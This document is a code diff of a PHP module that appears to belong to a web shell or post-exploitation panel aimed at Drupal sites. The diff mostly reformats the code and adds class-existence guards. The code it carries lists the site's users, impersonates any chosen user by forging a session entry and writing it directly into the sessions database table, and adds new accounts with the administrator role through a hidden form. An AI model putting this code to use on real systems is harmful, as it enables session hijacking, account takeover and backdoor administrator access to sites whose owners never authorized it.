@@ -15,79 +15,66 @@ $IMPERSONATE_DRUPAL_USER = "__FEAT_IMPERSONATE_DRUPAL_USER__";
  * @param $css string The CSS of the page
  */
 function __PREFIX__makeDrupalImpersonatePage(&$page_content, $features, $page, $css) {
+    $feature = array_values(array_filter($features, fn($feature) => $feature["op"] === $page));
+
     $users        = __PREFIX__getDrupalUsers();
     $page_content = __PREFIX__makePage(
         $features,
-        $page,
         $css,
-        [
-            __PREFIX__makePageHeader(
-                $features[$page]["title"],
-                $features[$page]["description"]
-            ),
-            __PREFIX__makeTable(
-                "Users",
-                "Drupal users to impersonate",
-                $users,
-                [
-                    "username" => "Username",
-                    "email"    => "Email",
-                    "active"   => "Active",
-                    "blocked"  => "Blocked",
-                    "roles"    => "Roles",
-                    "actions"  => "Actions",
-                ],
-                "
+        $page,
+        [__PREFIX__makePageHeader(
+            $feature[0]["title"],
+            $feature[0]["description"]
+        ), __PREFIX__makeTable(
+            "Users",
+            "Drupal users to impersonate",
+            $users,
+            ["username" => "Username", "email"    => "Email", "active"   => "Active", "blocked"  => "Blocked", "roles"    => "Roles", "actions"  => "Actions"],
+            "
                         <dialog id='create-drupal-user' class='p-4 rounded w-1/3'>" .
-                __PREFIX__makeForm(
-                    $page,
-                    $_SERVER["REQUEST_URI"],
-                    [
-                        "<div class='flex items-center justify-between'>
+            __PREFIX__makeForm(
+                $page,
+                $_SERVER["REQUEST_URI"],
+                ["<div class='flex items-center justify-between'>
                             <h3 class='text-lg font-semibold text-zinc-800'>Create Drupal user</h3>
                             <button onclick='document.getElementById(\"create-drupal-user\").close(); document.getElementById(\"create-drupal-user\").classList.remove(\"flex\")' 
                                 class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                 &times;
                             </button>
-                        </div>",
-                        __PREFIX__makeInput(
-                            "text",
-                            "Username",
-                            "__PARAM_2__",
-                            "admin",
-                            "Username of the user to create.",
-                            true
-                        ),
-                        __PREFIX__makeInput(
-                            "text",
-                            "Email",
-                            "__PARAM_3__",
-                            "admin@example.com",
-                            "Email of the user to create.",
-                            true
-                        ),
-                        __PREFIX__makeInput(
-                            "password",
-                            "Password",
-                            "__PARAM_4__",
-                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
-                            "Password of the user to create.",
-                            true
-                        ),
-                    ],
-                    "post",
-                    "Create user",
-                    "flex flex-col gap-y-6 mx-auto w-full"
-                )
-                . "
+                        </div>", __PREFIX__makeInput(
+                    "text",
+                    "Username",
+                    "__PARAM_2__",
+                    "admin",
+                    "Username of the user to create.",
+                    true
+                ), __PREFIX__makeInput(
+                    "text",
+                    "Email",
+                    "__PARAM_3__",
+                    "admin@example.com",
+                    "Email of the user to create.",
+                    true
+                ), __PREFIX__makeInput(
+                    "password",
+                    "Password",
+                    "__PARAM_4__",
+                    "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                    "Password of the user to create.",
+                    true
+                )],
+                "post",
+                "Create user",
+                "flex flex-col gap-y-6 mx-auto w-full"
+            )
+            . "
                     </dialog>
                     <button onclick='document.getElementById(\"create-drupal-user\").showModal()' 
                         class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                             hover:bg-zinc-700 transition-all duration-300'>
                         Create user
                     </button>"
-            ),
-        ]
+        )]
     );
 }
 
@@ -96,6 +83,11 @@ function __PREFIX__makeDrupalImpersonatePage(&$page_content, $features, $page, $
  */
 function __PREFIX__getDrupalUsers() {
     global $IMPERSONATE_DRUPAL_USER;
+
+    if(!class_exists("Drupal\user\Entity\Role") || !class_exists("Drupal\user\Entity\User") ||
+       !class_exists("Drupal")) {
+        return [];
+    }
 
     // Load all user roles.
     $roles = \Drupal\user\Entity\Role::loadMultiple();
@@ -129,18 +121,16 @@ function __PREFIX__getDrupalUsers() {
             ? __PREFIX__makeForm(
                 $IMPERSONATE_DRUPAL_USER,
                 $_SERVER["REQUEST_URI"],
-                [
-                    __PREFIX__makeInput(
-                        "hidden",
-                        "Username",
-                        "__PARAM_1__",
-                        "",
-                        "Username of the user to impersonate.",
-                        true,
-                        null,
-                        $partial_result["id"]
-                    ),
-                ],
+                [__PREFIX__makeInput(
+                    "hidden",
+                    "Username",
+                    "__PARAM_1__",
+                    "",
+                    "Username of the user to impersonate.",
+                    true,
+                    null,
+                    $partial_result["id"]
+                )],
                 "post",
                 "Impersonate",
                 "flex flex-col max-w-xl mb-0"
@@ -163,6 +153,16 @@ function __PREFIX__getDrupalUsers() {
  * @param $username string Username of the user to impersonate
  */
 function __PREFIX__impersonateDrupalUser($id) {
+    if(!class_exists("Drupal\user\Entity\User") || !class_exists("Drupal") ||
+       !class_exists("Drupal\Component\Utility\Crypt")) {
+        if(!class_exists("Symfony\Component\HttpFoundation\RedirectResponse")) {
+            header("Location: " . $_SERVER['REQUEST_URI']);
+            return;
+        }
+
+        return new \Symfony\Component\HttpFoundation\RedirectResponse($_SERVER['REQUEST_URI']);
+    }
+
     // Load the user by username.
     $user = \Drupal\user\Entity\User::load($id);
 
@@ -170,7 +170,7 @@ function __PREFIX__impersonateDrupalUser($id) {
     if ($user) {
         $database = \Drupal::database();
 
-        $auth           = true;
+        $auth            = true;
         $sf2_meta       = [
             // session timestamp
             "u" => time(),
@@ -195,12 +195,7 @@ function __PREFIX__impersonateDrupalUser($id) {
         try {
             $database->query(
                 "update {$prefix}sessions as s set s.session=:a, timestamp=:b, uid=:c where sid=:d",
-                [
-                    ":a" => $forged_session,
-                    ":b" => $sf2_meta['u'],
-                    ":c" => $id,
-                    ":d" => \Drupal\Component\Utility\Crypt::hashBase64(session_id()),
-                ]
+                [":a" => $forged_session, ":b" => $sf2_meta['u'], ":c" => $id, ":d" => \Drupal\Component\Utility\Crypt::hashBase64(session_id())]
             )
                 ->execute();
         }
@@ -224,6 +219,11 @@ function __PREFIX__impersonateDrupalUser($id) {
  * @param $password string The password for the new user.
  */
 function __PREFIX__addDrupalAdministratorUser($username, $email, $password) {
+    if(!class_exists("Drupal\user\Entity\Role") || !class_exists("Drupal\user\Entity\User") ||
+       !class_exists("Drupal")) {
+        return;
+    }
+
     // Load the user roles.
     $roles = \Drupal\user\Entity\Role::loadMultiple();
 
@@ -274,6 +274,11 @@ function __PREFIX__handleDrupalImpersonate($operation, $features) {
             $_POST["__PARAM_4__"]
         );
 
+        if(!class_exists("Symfony\Component\HttpFoundation\RedirectResponse")) {
+            header("Location: " . $_SERVER['REQUEST_URI']);
+            return;
+        }
+
         return new \Symfony\Component\HttpFoundation\RedirectResponse($_SERVER["REQUEST_URI"]);
     }
 }
@@ -302,14 +307,9 @@ function __PREFIX__drupalImpersonateHooksIsolatedOps(&$isolated_ops) {
 function __PREFIX__drupalImpersonateHooksFeatures(&$features) {
     global $IMPERSONATE_DRUPAL_USER;
 
-    $features[] = [
-        "title"       => "Impersonate Drupal user",
-        "description" => "Impersonate a Drupal user by changing the current session.",
-        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+    $features[] = ["title"       => "Impersonate Drupal user", "description" => "Impersonate a Drupal user by changing the current session.", "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
-</svg>',
-        "op"          => $IMPERSONATE_DRUPAL_USER,
-    ];
+</svg>', "op"          => $IMPERSONATE_DRUPAL_USER];
 }
 
 // section.functions.end
